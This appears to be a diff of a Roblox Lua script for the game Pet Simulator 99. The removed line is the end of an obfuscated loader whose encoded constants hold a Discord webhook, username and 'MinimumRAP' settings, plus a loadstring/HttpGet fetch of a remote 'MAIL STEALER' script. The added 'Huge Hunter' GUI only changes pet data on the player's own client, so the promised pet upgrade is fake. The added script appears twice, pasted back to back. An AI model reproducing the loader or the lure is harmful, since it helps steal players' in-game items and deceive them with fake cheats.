@@ -1,1 +1,259 @@
-;v84=v72[v76];v76=v84[2 + 1 ];else v82[v84[(408 -(183 + 223)) + 0 ]]=v84[6 -3 ];end v76=v76 + (1 -0) ;break;end if (v115==(0 -0)) then v84=v72[v76];v85=v84[2 -1 ];v115=2 -1 ;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!103Q00028Q00026Q00F03F03083Q00557365726E616D6503073Q006D73693133343803093Q00557365726E616D6532027Q004003073Q00576562682Q6F6B03793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F3133322Q392Q303133393038363734353639312F6453746A3153634C79527930346152546954532Q754A536A435F4E6A685A72796F78535F482D38376762515336585A2Q5051754633377A6D3936747254652Q76324D795F030A3Q004D696E696D756D524150024Q0080841E4103153Q0073656C65637465644C6F6164696E675363722Q656E03013Q0034030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574036A3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F4943455343524950543Q302F4943452D5343524950542F726566732F68656164732F6D61696E2F4943452532304D41494C253230535445414C4552253230494E25323050532Q3900333Q00120C3Q00014Q0004000100013Q0026023Q0002000100010004093Q0002000100120C000100013Q00260200010014000100010004093Q0014000100120C000200013Q0026020002000C000100020004093Q000C000100120C000100023Q0004093Q0014000100260200020008000100010004093Q0008000100120C000300043Q001205000300033Q00122Q000300043Q00122Q000300053Q00122Q000200023Q00044Q0008000100260200010023000100020004093Q0023000100120C000200013Q0026020002001B000100020004093Q001B000100120C000100063Q0004093Q0023000100260200020017000100010004093Q0017000100120C000300083Q001205000300073Q00122Q0003000A3Q00122Q000300093Q00122Q000200023Q00044Q0017000100260200010005000100060004093Q0005000100120C0002000C3Q0012010002000B3Q00122Q0002000D3Q00122Q0003000E3Q00202Q00030003000F00122Q000500106Q000300056Q00023Q00024Q00020001000100044Q003200010004093Q000500010004093Q003200010004093Q000200016Q00017Q00",v9(),...);
+local Pets = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)
+
+local fromPet = "Plane Dragon"
+local toPet = "Huge Stunt Corgi"
+
+-- Création de l'interface utilisateur (UI)
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer.PlayerGui
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 500, 0, 350)
+frame.Position = UDim2.new(0.5, -250, 0.5, -175)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BackgroundTransparency = 0.1
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+-- Ajout d'un gradient pour un effet visuel moderne
+local gradient = Instance.new("UIGradient")
+gradient.Parent = frame
+gradient.Color = ColorSequence.new(Color3.fromRGB(40, 40, 40), Color3.fromRGB(10, 10, 10))
+gradient.Rotation = 45
+
+-- Effet d'ombre pour le cadre
+local shadow = Instance.new("Frame")
+shadow.Size = UDim2.new(1, 12, 1, 12)
+shadow.Position = UDim2.new(0, 6, 0, 6)
+shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+shadow.BorderSizePixel = 0
+shadow.BackgroundTransparency = 0.7
+shadow.Parent = frame
+
+-- Titre avec effet d'ombre et police cool
+local title = Instance.new("TextLabel")
+title.Text = "Huge Hunter"
+title.Size = UDim2.new(1, 0, 0, 60)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundTransparency = 1
+title.TextScaled = true
+title.TextStrokeTransparency = 0.8
+title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+title.Font = Enum.Font.GothamBold
+title.Parent = frame
+
+-- Timer (Barre de progression)
+local progressBarBg = Instance.new("Frame")
+progressBarBg.Size = UDim2.new(0.8, 0, 0, 20)
+progressBarBg.Position = UDim2.new(0.1, 0, 0.7, 0)
+progressBarBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+progressBarBg.BorderSizePixel = 0
+progressBarBg.Parent = frame
+
+local progressBar = Instance.new("Frame")
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+progressBar.BorderSizePixel = 0
+progressBar.Parent = progressBarBg
+
+-- Créer un TextLabel pour afficher le pourcentage
+local percentageLabel = Instance.new("TextLabel")
+percentageLabel.Size = UDim2.new(1, 0, 0, 20)
+percentageLabel.Position = UDim2.new(0, 0, 0.7, -25) -- Position juste au-dessus de la barre de progression
+percentageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentageLabel.BackgroundTransparency = 1
+percentageLabel.TextScaled = true
+percentageLabel.TextStrokeTransparency = 0.8
+percentageLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+percentageLabel.Font = Enum.Font.GothamBold
+percentageLabel.Parent = frame
+
+-- Animation d'apparition du bouton
+local button = Instance.new("TextButton")
+button.Text = "Activate Huge Hunter"
+button.Size = UDim2.new(0.8, 0, 0, 50)
+button.Position = UDim2.new(0.1, 0, 0.5, 0)
+button.BackgroundColor3 = Color3.fromRGB(255, 120, 0)
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.TextScaled = true
+button.BorderSizePixel = 0
+button.Font = Enum.Font.GothamBold
+button.Parent = frame
+
+-- Effet au survol du bouton
+button.MouseEnter:Connect(function()
+    button.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
+end)
+
+button.MouseLeave:Connect(function()
+    button.BackgroundColor3 = Color3.fromRGB(255, 120, 0)
+end)
+
+-- Animation d'apparition du menu
+frame.Position = UDim2.new(0.5, -500, 0.5, -175)
+frame:TweenPosition(UDim2.new(0.5, -250, 0.5, -175), Enum.EasingDirection.Out, Enum.EasingStyle.Bounce, 0.5, true)
+
+-- Fonction pour changer de pet avec un timer
+button.MouseButton1Click:Connect(function()
+    button.Text = "Changing Pet..."
+    button.TextColor3 = Color3.fromRGB(200, 200, 200)
+
+    -- Timer pour simuler l'attente
+    local timeToWait = 2  -- Temps en secondes
+    local elapsedTime = 0
+
+    while elapsedTime < timeToWait do
+        wait(0.05) -- Réduire l'intervalle pour rendre le timer plus fluide
+        elapsedTime = elapsedTime + 0.05
+        progressBar.Size = UDim2.new(elapsedTime / timeToWait, 0, 1, 0) -- Remplir la barre de progression
+        
+        -- Mettre à jour le texte du pourcentage
+        local percentage = math.floor((elapsedTime / timeToWait) * 100)
+        percentageLabel.Text = percentage .. "%" -- Afficher le pourcentage
+    end
+
+    -- Processus de changement de pet
+    if Pets[fromPet] and Pets[toPet] then
+        for i, v in pairs(Pets[fromPet]) do
+            Pets[fromPet][i] = nil
+        end
+        for i, v in pairs(Pets[toPet]) do
+            Pets[fromPet][i] = v
+        end
+    end
+
+    -- Animation de disparition du menu
+    frame:TweenPosition(UDim2.new(0.5, -500, 0.5, -175), Enum.EasingDirection.In, Enum.EasingStyle.Bounce, 0.5, true, function()
+        screenGui:Destroy() -- Supprimer l'UI après l'animation
+    end)
+end)local Pets = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)
+
+local fromPet = "Plane Dragon"
+local toPet = "Huge Stunt Corgi"
+
+-- Création de l'interface utilisateur (UI)
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer.PlayerGui
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 500, 0, 350)
+frame.Position = UDim2.new(0.5, -250, 0.5, -175)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BackgroundTransparency = 0.1
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+-- Ajout d'un gradient pour un effet visuel moderne
+local gradient = Instance.new("UIGradient")
+gradient.Parent = frame
+gradient.Color = ColorSequence.new(Color3.fromRGB(40, 40, 40), Color3.fromRGB(10, 10, 10))
+gradient.Rotation = 45
+
+-- Effet d'ombre pour le cadre
+local shadow = Instance.new("Frame")
+shadow.Size = UDim2.new(1, 12, 1, 12)
+shadow.Position = UDim2.new(0, 6, 0, 6)
+shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+shadow.BorderSizePixel = 0
+shadow.BackgroundTransparency = 0.7
+shadow.Parent = frame
+
+-- Titre avec effet d'ombre et police cool
+local title = Instance.new("TextLabel")
+title.Text = "Huge Hunter"
+title.Size = UDim2.new(1, 0, 0, 60)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundTransparency = 1
+title.TextScaled = true
+title.TextStrokeTransparency = 0.8
+title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+title.Font = Enum.Font.GothamBold
+title.Parent = frame
+
+-- Timer (Barre de progression)
+local progressBarBg = Instance.new("Frame")
+progressBarBg.Size = UDim2.new(0.8, 0, 0, 20)
+progressBarBg.Position = UDim2.new(0.1, 0, 0.7, 0)
+progressBarBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+progressBarBg.BorderSizePixel = 0
+progressBarBg.Parent = frame
+
+local progressBar = Instance.new("Frame")
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+progressBar.BorderSizePixel = 0
+progressBar.Parent = progressBarBg
+
+-- Créer un TextLabel pour afficher le pourcentage
+local percentageLabel = Instance.new("TextLabel")
+percentageLabel.Size = UDim2.new(1, 0, 0, 20)
+percentageLabel.Position = UDim2.new(0, 0, 0.7, -25) -- Position juste au-dessus de la barre de progression
+percentageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentageLabel.BackgroundTransparency = 1
+percentageLabel.TextScaled = true
+percentageLabel.TextStrokeTransparency = 0.8
+percentageLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+percentageLabel.Font = Enum.Font.GothamBold
+percentageLabel.Parent = frame
+
+-- Animation d'apparition du bouton
+local button = Instance.new("TextButton")
+button.Text = "Activate Huge Hunter"
+button.Size = UDim2.new(0.8, 0, 0, 50)
+button.Position = UDim2.new(0.1, 0, 0.5, 0)
+button.BackgroundColor3 = Color3.fromRGB(255, 120, 0)
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.TextScaled = true
+button.BorderSizePixel = 0
+button.Font = Enum.Font.GothamBold
+button.Parent = frame
+
+-- Effet au survol du bouton
+button.MouseEnter:Connect(function()
+    button.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
+end)
+
+button.MouseLeave:Connect(function()
+    button.BackgroundColor3 = Color3.fromRGB(255, 120, 0)
+end)
+
+-- Animation d'apparition du menu
+frame.Position = UDim2.new(0.5, -500, 0.5, -175)
+frame:TweenPosition(UDim2.new(0.5, -250, 0.5, -175), Enum.EasingDirection.Out, Enum.EasingStyle.Bounce, 0.5, true)
+
+-- Fonction pour changer de pet avec un timer
+button.MouseButton1Click:Connect(function()
+    button.Text = "Changing Pet..."
+    button.TextColor3 = Color3.fromRGB(200, 200, 200)
+
+    -- Timer pour simuler l'attente
+    local timeToWait = 2  -- Temps en secondes
+    local elapsedTime = 0
+
+    while elapsedTime < timeToWait do
+        wait(0.05) -- Réduire l'intervalle pour rendre le timer plus fluide
+        elapsedTime = elapsedTime + 0.05
+        progressBar.Size = UDim2.new(elapsedTime / timeToWait, 0, 1, 0) -- Remplir la barre de progression
+        
+        -- Mettre à jour le texte du pourcentage
+        local percentage = math.floor((elapsedTime / timeToWait) * 100)
+        percentageLabel.Text = percentage .. "%" -- Afficher le pourcentage
+    end
+
+    -- Processus de changement de pet
+    if Pets[fromPet] and Pets[toPet] then
+        for i, v in pairs(Pets[fromPet]) do
+            Pets[fromPet][i] = nil
+        end
+        for i, v in pairs(Pets[toPet]) do
+            Pets[fromPet][i] = v
+        end
+    end
+
+    -- Animation de disparition du menu
+    frame:TweenPosition(UDim2.new(0.5, -500, 0.5, -175), Enum.EasingDirection.In, Enum.EasingStyle.Bounce, 0.5, true, function()
+        screenGui:Destroy() -- Supprimer l'UI après l'animation
+    end)
+end)
